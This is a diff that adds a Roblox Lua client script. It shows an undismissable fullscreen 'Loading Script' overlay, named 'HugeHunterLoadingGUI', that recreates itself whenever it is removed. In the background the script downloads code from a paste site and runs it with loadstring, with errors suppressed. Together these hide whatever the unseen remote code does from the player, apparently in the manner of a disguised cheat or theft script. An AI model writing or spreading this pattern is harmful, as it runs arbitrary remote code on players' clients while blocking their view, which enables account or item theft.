@@ -1,0 +1,73 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Function to create the fullscreen GUI
+local function createLoadingGUI()
+	local screenGui = Instance.new("ScreenGui")
+	screenGui.Name = "HugeHunterLoadingGUI"
+	screenGui.IgnoreGuiInset = true
+	screenGui.ResetOnSpawn = false
+	screenGui.DisplayOrder = 10000
+	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	screenGui.Parent = playerGui
+
+	-- Fullscreen Frame
+	local background = Instance.new("Frame")
+	background.Size = UDim2.new(1, 0, 1, 0)
+	background.Position = UDim2.new(0, 0, 0, 0)
+	background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	background.BackgroundTransparency = 0
+	background.BorderSizePixel = 0
+	background.Parent = screenGui
+
+	-- Centered Loading Label
+	local loadingLabel = Instance.new("TextLabel")
+	loadingLabel.Size = UDim2.new(1, 0, 0, 100)
+	loadingLabel.Position = UDim2.new(0.5, 0, 0.5, -50)
+	loadingLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+	loadingLabel.BackgroundTransparency = 1
+	loadingLabel.Text = "Loading Script"
+	loadingLabel.Font = Enum.Font.GothamBlack
+	loadingLabel.TextSize = 48
+	loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	loadingLabel.Parent = background
+
+	-- Animated dots label
+	local dotsLabel = Instance.new("TextLabel")
+	dotsLabel.Size = UDim2.new(1, 0, 0, 60)
+	dotsLabel.Position = UDim2.new(0.5, 0, 0.5, 30)
+	dotsLabel.AnchorPoint = Vector2.new(0.5, 0)
+	dotsLabel.BackgroundTransparency = 1
+	dotsLabel.Text = ""
+	dotsLabel.Font = Enum.Font.Gotham
+	dotsLabel.TextSize = 32
+	dotsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	dotsLabel.Parent = background
+
+	-- Animate loading dots
+	RunService.RenderStepped:Connect(function()
+		local tickTime = tick() % 3
+		local dotCount = math.floor(tickTime + 1)
+		dotsLabel.Text = string.rep(".", dotCount)
+	end)
+
+	return screenGui
+end
+
+-- Create and protect GUI
+local loadingGui = createLoadingGUI()
+loadingGui.AncestryChanged:Connect(function(_, parent)
+	if not parent then
+		loadingGui:Destroy()
+		loadingGui = createLoadingGUI()
+	end
+end)
+
+-- Load your external script in the background
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("http://vpaste.net/zmqqt", true))()
+	end)
+end)
